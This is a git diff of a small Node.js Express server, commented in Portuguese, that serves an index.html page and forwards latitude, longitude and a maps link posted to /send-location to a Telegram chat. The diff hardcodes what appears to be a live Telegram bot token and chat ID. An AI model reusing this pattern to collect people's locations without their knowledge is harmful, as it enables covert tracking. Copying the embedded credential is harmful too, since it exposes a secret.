@@ -2,14 +2,55 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
+const path = require("path");
 
 const app = express();
 app.use(cors());
-app.use(bodyParser.json());
+app.use(express.json());
 
-const TELEGRAM_BOT_TOKEN = "SEU_TOKEN_AQUI"; // Substitua pelo seu token do bot
-const TELEGRAM_CHAT_ID = "SEU_CHAT_ID_AQUI"; // Substitua pelo ID do chat
+// Servir arquivos estáticos da pasta atual
+app.use(express.static(__dirname));
 
+// Definir rota principal para servir o index.html
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "index.html"), (err) => {
+    if (err) {
+      console.error("Erro ao servir index.html:", err);
+      res.status(500).send("Erro interno no servidor");
+    }
+  });
+});
+
+// Defina os valores diretamente no código
+const TELEGRAM_BOT_TOKEN = "8145134129:AAGbRgrOOnc0_3_eCVawdvNBqHrDbY_EMhc";
+const TELEGRAM_CHAT_ID = "-4725079122";
+
+// Função para enviar mensagem para o Telegram
+async function sendTelegramMessage(text) {
+  try {
+    await axios.post(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: "Markdown",
+      }
+    );
+  } catch (error) {
+    console.error(
+      "❌ Erro ao enviar mensagem para o Telegram:",
+      error.response ? error.response.data : error.message
+    );
+  }
+}
+
+// Enviar mensagem ao Telegram quando o servidor iniciar
+async function notifyServerOnline() {
+  const message = "🚀 Servidor está online e pronto para receber requisições!";
+  await sendTelegramMessage(message);
+}
+
+// Endpoint para receber localização e enviar ao Telegram
 app.post("/send-location", async (req, res) => {
   console.log("📩 Recebendo requisição para /send-location");
   console.log("📌 Body recebido:", req.body);
@@ -33,16 +74,7 @@ app.post("/send-location", async (req, res) => {
     const message = `📍 Localização:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
     console.log("📤 Enviando para Telegram:", message);
 
-    const telegramResponse = await axios.post(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "Markdown",
-      }
-    );
-
-    console.log("✅ Telegram respondeu:", telegramResponse.data);
+    await sendTelegramMessage(message);
     res.status(200).json({ success: true, message: "Localização enviada!" });
   } catch (error) {
     console.error(
@@ -58,5 +90,12 @@ app.post("/send-location", async (req, res) => {
   }
 });
 
-// Exporta a API corretamente para a Vercel
+// Rodar na porta 8088 ou na definida pela Vercel
+const port = process.env.PORT || 8088;
+app.listen(port, async () => {
+  console.log(`Servidor rodando na porta ${port}`);
+  await notifyServerOnline();
+});
+
+// Exporta a API como um handler para a Vercel
 module.exports = app;
